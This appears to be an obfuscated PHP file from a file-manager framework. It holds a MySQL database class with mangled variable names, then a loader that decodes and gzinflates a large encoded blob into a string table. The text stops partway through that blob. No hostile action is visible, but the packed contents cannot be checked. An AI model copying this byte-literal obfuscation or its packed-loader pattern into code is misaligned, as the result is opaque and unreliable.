$ÏİæÎŞš); } } class DbMysql extends Db { public function __construct($ßÉ·Â´… = '') { $÷Íî—Ş« =& $_SERVER[„Ç©ñÎ©]; if (!extension_loaded($÷Íî—Ş«[807])) { think_exception(think_lang($÷Íî—Ş«[14]) . $÷Íî—Ş«[884]); } if (!empty($ßÉ·Â´…)) { $this->config = $ßÉ·Â´…; if (empty($this->config[$÷Íî—Ş«[17]])) { $this->config[$÷Íî—Ş«[17]] = $÷Íî—Ş«[12]; } } } public function connect($•ñëªó = '', $Åë£ûÃÜ = 0, $‚‹˜¹Æµ = false) { $¯û³ˆğ¶ =& $_SERVER[„Ç©ñÎ©]; if (!isset($this->linkID[$Åë£ûÃÜ])) { if (empty($•ñëªó)) { $•ñëªó = $this->config; } $ê€Ş–Æï = $•ñëªó[$¯û³ˆğ¶[885]] . ($•ñëªó[$¯û³ˆğ¶[886]] ? "\x3a{$•ñëªó[$¯û³ˆğ¶[886]]}" : $¯û³ˆğ¶[12]); $£·òÔØÀ = !empty($•ñëªó[$¯û³ˆğ¶[17]][$¯û³ˆğ¶[18]]) ? $•ñëªó[$¯û³ˆğ¶[17]][$¯û³ˆğ¶[18]] : $this->pconnect; if ($£·òÔØÀ) { $this->linkID[$Åë£ûÃÜ] = mysql_pconnect($ê€Ş–Æï, $•ñëªó[$¯û³ˆğ¶[887]], $•ñëªó[$¯û³ˆğ¶[888]], 131072); } else { $this->linkID[$Åë£ûÃÜ] = mysql_connect($ê€Ş–Æï, $•ñëªó[$¯û³ˆğ¶[887]], $•ñëªó[$¯û³ˆğ¶[888]], !0, 131072); } if (!$this->linkID[$Åë£ûÃÜ] || !empty($•ñëªó[$¯û³ˆğ¶[21]]) && !mysql_select_db($•ñëªó[$¯û³ˆğ¶[21]], $this->linkID[$Åë£ûÃÜ])) { think_exception(mysql_error()); } $Ö…şĞä€ = mysql_get_server_info($this->linkID[$Åë£ûÃÜ]); mysql_query($¯û³ˆğ¶[889] . think_config($¯û³ˆğ¶[890]) . $¯û³ˆğ¶[58], $this->linkID[$Åë£ûÃÜ]); if ($Ö…şĞä€ > $¯û³ˆğ¶[891]) { mysql_query($¯û³ˆğ¶[892], $this->linkID[$Åë£ûÃÜ]); } $this->connected = !0; if (1 != think_config($¯û³ˆğ¶[22])) { unset($this->config); } } return $this->linkID[$Åë£ûÃÜ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÊåŒÉ­É) { $“ñ¹ï¹× =& $_SERVER[„Ç©ñÎ©]; if (0 === stripos($ÊåŒÉ­É, $“ñ¹ï¹×[273])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÊåŒÉ­É; if ($this->queryID) { $this->free(); } think_action_status($“ñ¹ï¹×[23], 1); think_status($“ñ¹ï¹×[24]); $this->queryID = mysql_query($ÊåŒÉ­É, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($”¾Ï·šâ) { $£ä†à¾ =& $_SERVER[„Ç©ñÎ©]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $”¾Ï·šâ; if ($this->queryID) { $this->free(); } think_action_status($£ä†à¾[25], 1); think_status($£ä†à¾[24]); $°‚Õ¤× = mysql_query($”¾Ï·šâ, $this->_linkID); $this->debug(); if (!1 === $°‚Õ¤×) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[„Ç©ñÎ©][893], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ñî»·—± = mysql_query($_SERVER[„Ç©ñÎ©][894], $this->_linkID); $this->transTimes = 0; if (!$Ñî»·—±) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ı‹’Ö•¶ = mysql_query($_SERVER[„Ç©ñÎ©][895], $this->_linkID); $this->transTimes = 0; if (!$ı‹’Ö•¶) { $this->error(); return !1; } } return !0; } private function getAll() { $ş¥‡ôùå = array(); if ($this->numRows > 0) { while ($ÃÕ û = mysql_fetch_assoc($this->queryID)) { $ş¥‡ôùå[] = $ÃÕ û; } mysql_data_seek($this->queryID, 0); } return $ş¥‡ôùå; } public function getFields($‡Æ¾¸²µ) { $›§‡Ëı‡ =& $_SERVER[„Ç©ñÎ©]; $íÕ²™¶ = $this->query($›§‡Ëı‡[896] . $this->parseKey($‡Æ¾¸²µ)); $£íÊîË = array(); if ($íÕ²™¶) { foreach ($íÕ²™¶ as $„Ø¶®„• => $¦´ĞÑ) { $£íÊîË[$¦´ĞÑ[$›§‡Ëı‡[31]]] = array($›§‡Ëı‡[32] => $¦´ĞÑ[$›§‡Ëı‡[31]], $›§‡Ëı‡[33] => $¦´ĞÑ[$›§‡Ëı‡[34]], $›§‡Ëı‡[35] => (bool) (strtoupper($¦´ĞÑ[$›§‡Ëı‡[36]]) === $›§‡Ëı‡[897]), $›§‡Ëı‡[37] => $¦´ĞÑ[$›§‡Ëı‡[38]], $›§‡Ëı‡[39] => strtolower($¦´ĞÑ[$›§‡Ëı‡[40]]) == $›§‡Ëı‡[41], $›§‡Ëı‡[42] => strtolower($¦´ĞÑ[$›§‡Ëı‡[43]]) == $›§‡Ëı‡[44]); } } return $£íÊîË; } public function getTables($áÄ†Æè = '') { $âíÌş¦î =& $_SERVER[„Ç©ñÎ©]; if (!empty($áÄ†Æè)) { $¦÷ô×òç = $âíÌş¦î[898] . $áÄ†Æè . $âíÌş¦î[899]; } else { $¦÷ô×òç = $âíÌş¦î[900]; } $È¤‘ışÁ = $this->query($¦÷ô×òç); $ÏáƒúÛ = array(); foreach ($È¤‘ışÁ as $ÃŸ¬¼ñ‹ => $İ¥£Î‘Â) { $ÏáƒúÛ[$ÃŸ¬¼ñ‹] = current($İ¥£Î‘Â); } return $ÏáƒúÛ; } public function replace($óù„ëñù, $õâçúœÃ = array()) { $¸ãğ–“Ì =& $_SERVER[„Ç©ñÎ©]; foreach ($óù„ëñù as $Î§•…ƒƒ => $½à–ßËû) { $µÛ€û = $this->parseValue($½à–ßËû); if (is_scalar($µÛ€û)) { $ƒ¡¢â³â[] = $µÛ€û; $ƒÎ¤çí[] = $this->parseKey($Î§•…ƒƒ); } } $õ’×¶•¼ = $¸ãğ–“Ì[901] . $this->parseTable($õâçúœÃ[$¸ãğ–“Ì[288]]) . $¸ãğ–“Ì[902] . implode($¸ãğ–“Ì[50], $ƒÎ¤çí) . $¸ãğ–“Ì[903] . implode($¸ãğ–“Ì[50], $ƒ¡¢â³â) . $¸ãğ–“Ì[904]; return $this->execute($õ’×¶•¼); } public function insertAll($¦ìÔ¹œº, $•ÒûÑÖ = array(), $¡©ê°ƒ = false) { $¼·…ÂÇï =& $_SERVER[„Ç©ñÎ©]; if (!is_array($¦ìÔ¹œº[0])) { return !1; } $˜‚’‰ é = array_keys($¦ìÔ¹œº[0]); $”ÍŒßØ¿ = array(); foreach ($¦ìÔ¹œº as $•ÅÀ÷Üî) { $œ×Ğ²íÄ = array(); foreach ($•ÅÀ÷Üî as $’„û·€ => $Í‡ûŒ¶š) { $Í‡ûŒ¶š = $this->parseValue($Í‡ûŒ¶š); if (is_scalar($Í‡ûŒ¶š)) { $œ×Ğ²íÄ[] = $Í‡ûŒ¶š; } } $”ÍŒßØ¿[] = $¼·…ÂÇï[269] . implode($¼·…ÂÇï[50], $œ×Ğ²íÄ) . $¼·…ÂÇï[904]; } array_walk($˜‚’‰ é, array($this, $¼·…ÂÇï[905])); $Ó±Å¼« = ($¡©ê°ƒ ? $¼·…ÂÇï[906] : $¼·…ÂÇï[907]) . $¼·…ÂÇï[908] . $this->parseTable($•ÒûÑÖ[$¼·…ÂÇï[288]]) . $¼·…ÂÇï[902] . implode($¼·…ÂÇï[50], $˜‚’‰ é) . $¼·…ÂÇï[909] . implode($¼·…ÂÇï[50], $”ÍŒßØ¿); return $this->execute($Ó±Å¼«); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÀŠõæ´¼ =& $_SERVER[„Ç©ñÎ©]; $this->error = mysql_errno() . $ÀŠõæ´¼[4] . mysql_error($this->_linkID); if ($ÀŠõæ´¼[12] != $this->queryStr) { $this->error .= LNG($ÀŠõæ´¼[48]) . $this->queryStr; } think_trace($this->error, $ÀŠõæ´¼[12], $ÀŠõæ´¼[49]); return $this->error; } public function escapeString($Æ¶İÙÉÜ) { if ($this->_linkID) { return mysql_real_escape_string($Æ¶İÙÉÜ, $this->_linkID); } else { return mysql_escape_string($Æ¶İÙÉÜ); } } public function parseKey(&$úë»òÆ¥, $¹†ğıÀÀ = true) { $ïß¿¯³® =& $_SERVER[„Ç©ñÎ©]; if ($¹†ğıÀÀ) { $úë»òÆ¥ = $this->parseKeyCheck($úë»òÆ¥); } if ($úë»òÆ¥ != $ïß¿¯³®[198] && !preg_match($ïß¿¯³®[910], $úë»òÆ¥)) { $úë»òÆ¥ = $ïß¿¯³®[394] . trim($úë»òÆ¥, $ïß¿¯³®[394]) . $ïß¿¯³®[394]; } return $úë»òÆ¥; } } goto B–ø•ÔÖ¤æ; B‹‹¡—İŠ’: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('hMep8c6p'), "\361\214\371\371\216\372"); $_SERVER[„Ç©ñÎ©] = explode(base64_decode('fAJ8BXwG'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\325\50\45\354\120\312\322\322\225\62\30\22\333\211\26\307\131\110\234\330\211\154\313\266\210\54\31\111\316\202\355\114"."\306\322\310\232\130\322\310\63\43\157\111\240\24\302\226\4\112\241\264\100\112\113\131\136\130\303\276\224\255\205\102\13\1\176\12\45\154\5\332\102\22\240\100\333\277\24\112\113"."\xe1\xdd\xe5\xdc\x65\x46\x32\xfc\xef\x7b\xef\xfb\x5e\x3e\xb0\xee\x3d\x77\x99\xbb\x9c\x7b\xee\x39\xe7\x9e\x7b\xee\x33\xaf\x9e\xf7\xc4\x7b\x67\xaf\xdf\x7b\xfd\xbe\xeb\xf7\xdb\x79\xf1\xe6\x7b\xfe"."\x7e\x1\xd\xaf\xdf\x67\xfd\x17\xd0\x5f\x12\x3e\x66\xd3\x1\x7b\x91\x7f\x47\x6e\x3a\xb7\xae\xae\x6b\xfe\x41\xb3\x62\x87\x9c\x7f\xfb\x8d\xda\xb5\xda\xd\xda\xa6\x78\x74\xc7\x13\x91\x2f\x3e\x75".base64_decode('w4nh3VfumNj9hb0u3fLm35tQZlq2if4oRdNR9HHDdmwKSJvFrDFEw0aR/gbpT28i')."\x6a\xe9\x5\xd3\xd1\x69\x34\x40\x7f\x54\x68\x17\xf9\x6b\x8f\xe4\xd\x96\xae\xc6\xe2\x29\x35\xd9\xdb\xd3\x13\x4e\xa4\x20\x53\x93\x9c\x5e\x30\x33\x10\x2a\x69\x96\x56\x80\xef\x97\x74\xcb\x46\xad".strrev('e\',ÑÒ`‘Öë)PcÂz«SR¯Ü=µVö¦¡³PmÑ º/IfKS«‘')."\x74\x9e\x63\xcc\xe2\xed\x6a\xd\x77\x46\x62\x4a\x2a\x11\x8a\x25\x43\x6d\xa9\x48\x3c\x46\xc1\x6d\xf1\xee\xee\x48\xaa\x12\x9e\x88\x47\xa3\xad\xa1\xb6\x65\x95\x29\x3d\x89\x50\x67\x77\x48\x41\xed".strrev('Ú´aç+Vz2‡ŒHÓÏœ±SMx¥%8æ±¨°hgÏC§©F²šÊušÌQªëË').strrev('Vï#¥@Ü¥·'."\r".'2UP‹Ö‰£MmG4±ÜxHÓLQ¦;+@iC‚}2ôë'."\n".'2ÉHå').strrev('Ö”\'h,©TËCU‰Bôpj©•FŠ…'."\r".'Kà'."\n".'µ¯¤µÍÑ¸+œ+¢²–èíš'."\n".'`')."\125\212\30\241\264\131\50\230\305\0\252\5\315\244\43\65\65\234\110\320\200\17\320\73\32\301\223\6\221\170\107\107\62\314\143\320\271\223\242\250\45\163\0\77\135\261\114\66".base64_decode('76ijWr7M0HSY/tbCD/yqWtbIQxYcso1JXU5JonikKNLVId1R0TJzUKsB6VtDyUib')."\332\23\112\165\301\54\224\112\101\73\63\154\7\65\53\235\63\106\365\250\61\30\34\64\212\101\214\354\201\101\266\54\17\242\77\163\141\114\162\172\172\130\325\6\115\313\321\1".strrev('2»úæÁ¥½@}o*=g[–e‹äÓQĞLXe(Äk|6›F„Q¼ÅÊ¥')."\15\342\36\216\352\226\243\352\305\264\231\61\212\100\122\226\300\322\320\234\134\273\205\172\146\301\270\230\371\14\13\213\361\303\243\25\53\27\344\54\74\212\306\45\237\261\364\342"."\347\347\244\321\50\47\52\70\257\210\225\120\113\70\75\62\262\23\202\52\330\146\331\112\243\231\313\232\242\134\17\317\75\33\62\351\216\203\72\7\143\143\230\275\245\274\251\145"."\x92\xba\xc5\xbb\x66\x98\x1d\xa8\x60\xbc\xec\xc8\xc0\x32\xc9\xd6\x61\x5a\x85\x76\x34\xa5\xf0\x7d\xb4\x76\x8d\xde\x2a\x9\xc3\x6c\xf5\x66\xa4\x11\xb\xd6\xf5\x9d\xe6\xff\x64\xa0\x6f\x29\xfa\x53".base64_decode('DwS6H9qU0/N5VR/XYXkXMvNsNhhBG+MRgtBoJK7mNDvXnZmnklKM7mf08UApVwLa')."\303\311\115\277\153\371\341\241\213\231\116\130\332\75\362\146\132\313\313\135\244\341\234\343\224\222\172\61\323\301\27\112\306\34\53\222\221\52\351\14\133\333\175\112\106\351\126\126"."\51\135\115\106\223\315\12\26\362\74\304\172\307\141\66\7\72\343\154\72\63\131\32\340\253\244\6\76\150\330\204\16\13\42\202\26\131\336\110\153\216\141\26\203\146\332\321\35"."\277\355\130\272\6\65\206\322\151\335\266\375\155\150\235\132\146\336\37\312\347\315\61\177\334\62\206\214\142\223\62\23\266\4\272\210\375\230\114\67\1\75\251\131\244\140\104\301".base64_decode('n5nZXHay/gWMTvDclla0s7rlD8PKaFJQYzmtZtnaDbtk2gZuXpOiOY6WzmE6J6pv')."\376\214\374\6\136\371\172\105\336\360\170\311\260\164\233\265\125\351\354\116\101\45\250\166\335\337\143\151\103\5\255\111\51\225\7\321\310\300\112\255\2\243\271\141\150\232\224\64"."\x8e\xfa\x94\x42\xd9\x76\xfc\x96\x8e\x8\xa6\x81\xe8\x14\xc\x72\x24\xeb\xef\xc6\xeb\xca\xd0\x33\xfe\x24\xda\x57\x0\x3c\xa7\x61\xae\x82\x50\x47\x61\x69\x14\xda\x95\x4a\xf5\xa8\x91\xe\xc4\x38"."\304\302\152\167\50\325\6\344\60\354\150\103\254\315\121\264\133\360\52\31\160\245\37\255\57\214\134\61\324\127\1\354\61\307\164\13\175\270\165\242\111\31\66\63\203\346\170\200".base64_decode('JXUAYWaZ8XSXHH9CKw7h8RmccHRAQXt0yD3QUb045ORYwWQ4sTycUJPxjtSKUAJY').strrev('wV.rü™Fß»L¤h´°Áx©b¹àqx<±¨ğ•§+Óèh3ĞŸŞu\\)öq’Â"').base64_decode('1CgYuO0OTyEjifiRTmhQkHSouT83s64/M6vej/7OrO/rbw/MHFgSNESZ4OzAbKWx').strrev('ÅuNÚ”ÉÃz“á•†{ÙiXwƒƒş¢Í6X{™|J'."\r".'ŠéĞ+ËC$ƒÒ¾a')."\xdb\xe1\xeb\xe1\x10\x84\xa2\x26\x5d\xb6\xac\xb7\x7d\xf4\x67\x0\x66\x77\x0\x76\x5f\xc3\xee\x90\xb6\x15\x1c\xe5\xe4\x47\x35\x7\xd7\xa2\xc9\xe8\xd6\x19\x8d\xcd\x52\x1a\x1d\x29\x68\x43\x1e\x92"."\x8f\x63\xdd\xa6\xa5\xbb\x21\x62\xab\x5a\x61\x64\xd8\x9e\x80\xa3\x5d\xba\x31\x94\x83\xf1\x32\x70\x6d\x69\x33\x6f\x5a\x5a\x1e\x53\x46\xb6\x28\x74\x46\xad\x86\xc\xa0\x56\x40\x84\x45\x24\x69\x14"."\112\254\261\116\256\134\30\224\202\100\355\155\204\77\214\226\345\114\276\237\241\375\237\206\232\202\220\161\172\143\7\243\366\301\344\34\364\237\40\355\31\263\240\61\102\111\110\234".base64_decode('nqE0joJmulK6dE1s0o7lmBhqubKgAc2ZMLGIzYEmlXnbWCszel5no5HT2TbRANnQ')."\66\307\307\112\360\126\210\47\105\120\261\77\33\166\2\225\304\104\235\305\127\140\46\136\0\34\236\65\217\166\250\70\231\161\21\357\261\364\254\1\213\264\210\146\244\133\263\206"."\x59\x6f\xd0\xc\x8\x5c\xc1\x11\x9\x8f\x3a\x7a\xa3\x51\xb5\x2d\x1e\x4b\x21\xc6\x9f\x42\x56\x24\x22\xa9\x30\xc3\xdb\x50\xbb\x1a\x6a\xeb\xe1\x1b\xaf\x98\x51\xc8\x80\x9\x4c\xe5\xee\x41\x21\xa3"."\215\320\160\324\234\240\330\346\20\305\56\231\105\133\367\3\323\350\27\2\102\105\122\106\354\2\100\147\304\316\341\331\14\306\375\132\141\322\137\100\113\300\317\33\352\336\203\225"."\x94\xbc\x95\x47\x60\x96\x4\x71\xc7\xc3\x88\x64\x37\xb6\xf9\xf7\xc4\x93\x50\x60\x9\x86\x22\x6\x6c\x50\xb7\xe0\x63\x3d\xbd\x90\x54\x90\x30\xa4\x33\x9c\x62\x1b\xb9\x6\xfc\x54\x68\x45\x92\x51"."\344\62\312\150\31\223\232\350\313\22\326\20\326\203\102\136\60\162\356\356\370\305\220\247\272\42\261\145\152\167\274\75\34\125\43\61\104\222\122\225\360\336\236\366\20\233\103\31"."\336\32\147\54\71\100\173\21\121\132\36\212\106\274\331\303\53\43\311\124\262\152\22\202\365\206\75\51\110\116\355\111\204\73\42\53\171\264\43\22\216\266\47\325\266\120\133\227"."\xc8\x13\xb\x75\x43\x44\xcd\x62\x49\xd1\xe\xba\xf3\xab\x88\xba\x26\xb9\xbc\xa9\x8e\x62\xd9\x99\xd\x96\xea\x12\xf1\x54\x26\xbc\xa8\x2\x79\xd0\x2e\xaa\x3\x8a\x41\x77\xb1\xc4\x4e\x7a\x2\xf2"."\x7a\xda\x2c\x33\xda\xcf\x39\xc8\x2\x23\xe\x5\xd\x56\x8f\xc6\x76\xc8\x3a\xfa\x53\xaf\x84\x92\x8a\x53\x52\x39\x19\x18\x9c\xe0\x41\xd2\xd\x16\x47\xbc\x22\x7c\x5f\x1\x4a\x5f\xd1\x2\x15\xe7"."\x69\xd5\xb3\x9c\x0\x57\x7\x84\xb2\xe\xa7\xf3\x9e\x38\xc2\x7a\x91\x86\x66\x20\x44\x54\x3\x8\x13\xc8\x8c\xc0\x67\xc\xb4\x86\x2c\x27\xc4\x9a\x93\x15\x62\xb9\x1a\xef\x9\x27\x42\x58\xa8\x57"."\x57\x24\xe2\xb1\x4e\x28\x30\x96\xd3\x59\x3\x22\x30\xfc\x75\x8c\xab\x2\xd9\xde\x11\x94\x8\xb1\x44\x1a\x13\x9f\xc4\xa0\xaf\x35\xd9\x50\xae\xa7\x3f\x33\xe8\xf\xe2\x6\xe1\xe3\x7a\x91\x8d\xfa".base64_decode('ICbKbFthgSxaDYygmmX+tUHTzLMFihgDTim4bmCtzZBknNGYWWxngo0hFV8WjqkM')."\263\150\114\302\106\12\100\322\166\74\1\3\342\230\303\114\30\243\211\211\160\222\55\157\113\37\51\33\154\270\202\201\131\200\305\72\332\173\340\363\301\325\375\143\263\352\372\374"."\xb3\x2\x3\x28\x50\x3f\x73\x29\x8d\x42\xac\x3f\xe0\x8a\x1e\xf\xe5\xcb\x16\x2f\x8d\xf9\xa5\x3a\x7b\x49\x7d\x53\x7f\xb0\x3f\x58\xb7\xa4\xa9\x2f\xe4\x9f\xd4\xfc\x93\xd\xfe\x85\xfe\x81\x59\xfd"."\x81\xfa\x59\x0\x18\x58\xd7\xe8\x9b\xbb\x1\x67\x40\x19\x97\x1c\x37\x80\x7e\x9a\xfb\x97\x4c\xef\xf7\xcf\x38\x65\xcd\xd2\xbe\xfe\x81\xda\xa6\x59\xc7\xf6\x7\x8e\xeb\x1f\x1b\x98\x59\xbf\x84\x7d"."\x27\x5d\xb6\x90\xa0\x99\x9e\xe0\x4d\xcd\xcc\xaa\x43\x4d\x42\x7c\x14\xcf\x52\x24\xb4\x4e\xca\xc0\x12\x26\x8d\x92\x80\xae\x9b\xbf\x81\xc1\xd1\x1c\xea\x43\xa2\x44\x9f\xbf\x7f\xd6\xc0\x12\xa9\x9c"."\4\362\176\13\361\111\210\360\346\170\276\220\377\144\334\63\136\24\257\173\300\217\162\61\55\250\47\136\27\203\132\32\350\200\61\124\344\113\10\155\346\134\100\167\263\357\353\246"._kodDe('LNHFXv95FGPmDDhLfPS1Ht5/CZgDGxcV3CICeA910SWsJZgy5kliEw6F+UMLBoQFvQ==')."\216\20\276\200\45\51\216\243\34\231\214\222\212\131\253\61\36\313\350\105\230\247\3\41\267\235\326\112\172\122\352\241\252\246\102\255\321\260\312\50\14\120\142\26\47\124\261\225".base64_decode('axRR1wRFZfQhLXh3IqbAyrdH8gohDIpuWabVRJSrdrmEeTIkkjlobBUkzCvNLQod').strrev('Æz†În°;?šø„>™é÷/ïë¬[¤â6C1%M ¡Lz,]lÅ€ƒÒPÊ§(r').strrev(' Üm‰¤a)WyhéÏqrTo8´Ôi“Â+Špvàchªœ©óQU	?ÑûŞ').base64_decode('TaCzHRUUC2/lkn6UkNMYl965UkRS0OESSd0J8Bw+KVFFcZeuurmGEfsiWk5t0lZH')."\165\72\311\11\333\321\13\56\245\252\255\143\205\134\107\71\237\167\70\17\237\67\206\341\13\260\126\100\307\353\207\335\140\126\265\242\35\246\305\104\341\231\320\214\232\231\325\62".base64_decode('RopFJLjKqCY22c4QYmdSSh3TRyqRmNIaj0fDoZiC93PYhxCzkAz3hNAmhoXqZCoM')."\x2a\xd2\x48\xbb\x9f\xd5\xbb\xd2\x1f\x1\xd1\x8a\x7\xc\x18\x76\xb3\x84\x29\x88\x8a\xc6\x44\x45\x22\xcc\x30\x9b\x4b\x44\x10\x1d\x96\x15\x14\x65\x10\xc3\x1c\xa6\xf\xab\x86\x7c\x98\xd3\xf0\xa1"."\76\370\260\134\344\23\354\273\117\150\332\174\243\206\76\106\2\234\313\366\1\363\355\163\64\13\61\14\230\73\206\140\244\335\147\330\355\104\162\40\37\40\111\254\101\116\16\53".base64_decode('QPLahI82LqqP6nkfa5qPtdjHhEIfkeTaoVm9aHFBs0gQ0dCcD6MTxmaf0AT6zLGi')."\156\221\54\60\114\102\350\360\11\201\304\67\144\231\345\122\17\373\246\24\243\315\2\200\150\63\7\44\114\323\361\61\41\323\47\313\237\320\212\20\133\65\125\207\263\172\157\310"."\370\173\33\1\163\207\223\52\107\351\163\46\253\162\76\334\262\366\72\132\43\10\363\33\330\236\347\312\43\246\227\55\303\274\56\142\170\2\104\150\271\130\306\270\103\35\332\250"."\x8c\x79\xd5\xb0\x90\xed\x3c\xc\x8d\x85\xda\x4f\x28\x7c\x5\x27\xec\x15\x2d\xbd\xaa\x60\xfc\xd1\x94\x36\x94\x94\x3e\xe7\x68\x43\xec\x5b\x98\x94\xa1\xd4\x29\xb3\xd2\x70\x42\x4f\x4f\xa4\x85\xac"."\332\56\111\300\356\230\173\161\225\121\175\111\55\353\351\244\217\254\262\152\53\244\72\6\160\254\347\23\166\320\201\7\262\21\147\113\201\317\276\153\5\175\376\332\205\136\22\162"."\31\57\11\206\203\66\26\223\354\44\332\0\73\362\154\210\32\345\144\40\326\76\167\14\57\275\0\41\336\344\324\47\311\225\32\321\160\107\112\71\61\216\50\235\141\252\264\214"."\x8a\x33\x2b\xe4\x8f\x59\x54\x5c\x75\xb3\xe1\x52\x9a\x49\xba\x88\x6b\xc5\xc\x85\xac\x41\xbb\xc2\x9a\xe6\x1a\xf6\x91\x1a\x57\x71\x81\x34\xee\x46\xf8\x58\x54\xa9\x44\x43\x3c\xdc\xf2\x20\x60\xe4".base64_decode('IN0XOxkDxcXGWQYuUbNBXsP6cQjpDCamVsZSiRgJAGuX67s4KlYYQwkFf8An8TWY')."\340\370\305\132\221\242\356\41\367\140\244\147\273\305\103\324\143\24\47\214\242\254\312\22\120\261\143\13\206\1\57\165\217\362\255\175\252\60\335\142\204\252\314\7\52\64\37\76"."\362\222\66\163\241\307\101\255\47\307\157\5\227\322\257\262\345\214\350\102\247\173\223\341\204\312\276\15\253\33\60\76\247\131\142\60\31\115\302\204\101\50\10\161\26\21\225\262".strrev('e0±²Ö(ÕfSOI‡t.?(ì22¢Õ!ÅÒ*ŸmR» åëX&vÅ”HÊ¸ÌÁQµe')."\26\370\141\42\232\204\72\106\124\200\31\121\45\225\2\47\112\156\212\107\233\24\342\33\0\332\126\321\246\110\303\210\367\317\243\275\320\12\340\65\324\211\167\64\171\63\161\63".strrev('¹É–ãÕîŒ(ÙZ¸i‡Z$2¨\\Ş± –-ca3bo	:…¹É¤VKj\'(-I$')."\x66\xce\x24\x78\x33\xb5\x11\xb1\x94\x1f\x63\x7a\x36\x76\x69\x70\x5c\xcc\x48\x5\x48\x2a\xe3\x65\x4b\x3c\x50\x4f\x54\xcc\x8a\x6b\x57\xa2\x20\xa6\x7b\xd6\x32\x5\xa3\x18\xb0\xe8\xde\x17\x40\xc2"."\6\34\75\373\32\44\316\115\20\245\165\66\331\105\140\257\334\340\231\164\307\64\221\4\153\5\54\364\145\321\40\211\40\2\65\41\47\223\170\323\224\371\15\136\213\215\22\44"."\xd2\xee\x66\xab\x58\xc9\x64\x49\x63\xcb\x2\xe4\x93\x32\xff\xc\xe7\x1\x81\xa6\x19\xe9\x61\xb1\x94\xb5\x51\xd\x21\x23\x54\x4d\x3a\x23\x5a\x4a\xe3\x51\xce\x46\x63\x4a\x13\xce\x18\xe\x86\xe0"."\215\324\144\212\162\221\121\72\216\346\60\231\300\223\175\252\142\362\205\114\342\233\356\312\351\346\64\0\70\223\60\0\1\301\30\311\247\361\151\263\4\170\40\231\310\24\314\121"."\135\2\6\154\307\54\211\24\51\112\223\245\44\121\251\224\213\117\15\151\7\132\142\31\302\124\213\201\42\171\241\54\221\317\351\52\16\140\211\44\40\323\362\220\145\61\264\245"."\235\303\47\74\10\50\203\60\5\114\262\65\127\155\113\243\225\207\107\205\1\14\255\12\177\70\100\51\100\100\313\144\342\354\224\113\16\127\146\225\165\225\325\53\42\326\110\274".base64_decode('KilWPXsonxe2Ad74lEXoYpcLyZApi3UQ4Zid1VWDcUFIXmxuZl5YdHiZfjfdnprB').base64_decode('mYLIiQmtHkc8QVvOKOo239otuxrN+v/MSVfOAV4rUyEOTpP029gkb9S1j3MlriBZ')."\22\253\102\266\175\325\161\61\131\11\122\207\264\170\134\370\200\26\53\355\63\336\226\42\161\264\30\253\143\250\67\237\316\324\330\204\316\215\363\255\125\56\204\223\360\174\115\125"."\51\117\347\225\11\206\116\316\207\60\23\47\114\125\15\113\346\265\334\376\363\137\75\166\333\353\64\174\335\55\277\337\175\361\3\64\74\156\146\106\363\345\265\64\2\202\12\372"."\213\215\56\111\130\230\134\156\134\271\316\374\346\257\17\357\334\164\312\141\265\167\356\33\376\242\161\342\361\323\157\271\366\340\344\372\256\213\352\376\66\162\121\146\307\226\103\167"."\xdc\xdb\xfc\xdf\xbf\xba\xff\xe5\xd7\x5f\xbd\xbc\xeb\xba\x4f\x7e\x9d\xbb\x6c\xc1\xa9\x57\x75\x9d\xf4\xd5\x6d\x9b\x8e\xba\xf1\xb7\x7b\xfb\x9f\x7e\xf4\xd0\xa7\x95\xd0\x91\xef\xbf\x9c\x3a\x7f\xfd"."\246\167\136\151\171\357\274\133\217\10\75\375\356\23\117\275\367\324\23\237\354\276\345\361\226\217\376\170\341\61\315\37\375\162\257\77\266\54\35\130\160\350\117\343\267\155\310\151"."\x7b\x7f\xb4\x79\xd1\xfc\xf8\xb9\x8f\xae\x9d\xfd\xa5\x4d\xfb\xed\xd9\xeb\xbf\xfe\xbc\x5f\xe0\x98\x75\x75\x5f\x7b\xe1\xda\x5b\x2e\xfd\xd3\xa9\x2f\x1f\x78\x9a\x7f\x73\xe7\xfa\xf6\x73\x9a\xbf\xb6"."\364\241\163\176\67\262\152\315\111\13\277\260\367\271\347\374\76\126\274\365\265\302\21\157\256\71\50\175\304\376\153\43\167\355\174\161\273\321\274\341\301\227\377\260\171\335\235\303"."\xf\x19\x3b\xbf\x39\xf9\xe1\x3e\xaf\x8f\x4\x92\x7b\x5f\x72\x9b\xb5\xfb\xcd\x3d\x1f\xbe\xff\xe1\xf\x8f\xbf\xec\xd4\xd1\xbe\xde\x96\xa7\x27\x3f\xee\xbb\xe9\x57\xa7\x77\xc\x9f\x7f\xfe\x9\x97"."\xdd\xb8\xc5\x4a\xc6\x6f\xdd\xfb\x98\xef\xbf\x73\xed\x17\x6b\x57\xbd\x73\xd2\x37\xef\x3d\xe5\xf1\xeb\xb4\xd7\x4e\xd8\xb9\xe6\xb5\x5b\x9f\x78\x66\xb2\xf5\xdb\xda\xee\x6f\xfa\x1b\xe\x79\xf3\xdf"."\x5b\x37\x34\xdd\xf6\xc7\x99\xfd\xab\x1f\xdb\x65\x77\x3c\x73\xfd\xaa\x4f\x8c\x97\x5a\x6e\x7c\xb9\xeb\x92\x45\x5b\xff\xf1\x5f\xd6\xee\x73\x2f\x8\xfe\x68\xd